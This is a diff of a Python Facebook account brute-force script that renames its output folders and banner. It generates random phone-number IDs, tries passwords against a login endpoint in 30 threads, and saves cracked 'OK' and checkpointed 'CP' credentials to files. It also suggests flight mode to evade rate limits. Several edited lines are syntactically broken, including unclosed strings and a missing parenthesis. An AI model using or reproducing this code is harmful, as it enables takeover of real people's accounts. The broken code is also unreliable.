@@ -31,20 +31,33 @@ cps = []
 
 sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛YounisXyz 🙂💗 \x07')
 
-try:os.mkdir('/sdcard/XYZ')
+try:os.mkdir('/sdcard/smg)
 except:pass
 
 
 ###-------[LOGO]-----------####
 logo= f'''\033[1;97m
-     Y88b   d88P Y88b   d88P 8888888888P 
-      Y88b d88P   Y88b d88P        d88P  
-       Y88o88P     Y88o88P        d88P   
-\033[1;32m        Y888P       Y888P        d88P
-        d888b        888        d88P\033[1;97m
-       d88888b       888       d88P      
-      d88P Y88b      888      d88P       
-     d88P   Y88b     888     d8888888888 
+       
+       
+
+                                  
+                                  
+  _______  ______ ____    ______  
+ /       \|      \    \  /      \ 
+|  $$$$$$$| $$$$$$\$$$$\|  $$$$$$\
+ \$$    \ | $$ | $$ | $$| $$  | $$
+ _\$$$$$$\| $$ | $$ | $$| $$__| $$
+|       $$| $$ | $$ | $$ \$$    $$
+ \$$$$$$$  \$$  \$$  \$$ _\$$$$$$$
+                        |  \__| $$
+                         \$$    $$
+                          \$$$$$$ 
+
+        
+
+
+      
+     
      
 \033[1;97m---------------------------------------------------
  \033[1;97m[\033[1;92m•\033[1;97m] Author   : Muhammad Younis
@@ -104,7 +117,7 @@ def random_number():
     for _ in range(limit):
         x = "".join(random.choice(string.digits) for _ in range(7))
         idz.append(x)
-    with ThreadPoolExecutor(max_workers=30) as XYZ:
+    with ThreadPoolExecutor(max_workers=30) as smg:
         clear()
         total_idz = str(len(idz))
         print(f"\033[1;96m BRUTE HAS BEEN STARTED BE PATIENT")
@@ -112,7 +125,7 @@ def random_number():
         linex()
         print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
         print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
-        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
+        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/smg')
         linex()
         for xyz in idz:
             uid = code+xyz
@@ -194,14 +207,14 @@ def crack(uid, pww, total_idz):
             po = requests.post(url, data=data, headers=headers).json()
             if "session_key" in po:
                 print(f"\r\033[1;92m [XYZ-OK] {uid} | {pw}")
-                open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
+                open("/sdcard/smg/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif "www.facebook.com" in po["error"]["message"]:
                 cpclr = random.choice(["\033[1;90m","\033[1;91m","\x1b[38;5;205m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-                print(f"\r{cpclr} [XYZ-CP] {uid} | {pw}")
-                open("/sdcard/XYZ/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
-                cps.append(uid)
+                print(f"\r{cpclr} [smg {uid} | {pw}")
+                open("/sdcard/smg/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
+                cps.append(uid
                 break
             else:
                 continue
